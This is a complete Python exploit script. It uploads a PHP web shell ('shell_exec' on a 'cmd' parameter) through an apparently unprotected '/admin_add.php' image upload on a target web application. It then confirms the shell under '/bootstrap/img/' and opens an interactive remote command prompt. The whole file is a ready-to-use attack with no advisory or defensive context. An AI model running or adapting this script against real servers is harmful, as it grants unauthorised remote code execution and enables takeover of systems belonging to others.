import argparse
import random
import requests
import string
import sys

parser = argparse.ArgumentParser()
parser.add_argument('url', action='store', help='The URL of the target.')
args = parser.parse_args()

url = args.url.rstrip('/')
random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))

payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'

file = {'image': (random_file + '.php', payload, 'text/php')}
print('> Attempting to upload PHP web shell...')
r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
print('> Verifying shell upload...')
r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)

if random_file in r.text:
    print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php')
    print('> Example command usage: ' + url + '/bootstrap/img/' + random_file + '.php?cmd=whoami')
    launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
    if launch_shell.lower() == 'y':
        while True:
            cmd = str(input('RCE $ '))
            if cmd == 'exit':
                sys.exit(0)
            r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)
            print(r.text)
else:
    if r.status_code == 200:
        print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.')
    else:
        print('> Web shell failed to upload! The web server may not have write permissions.')
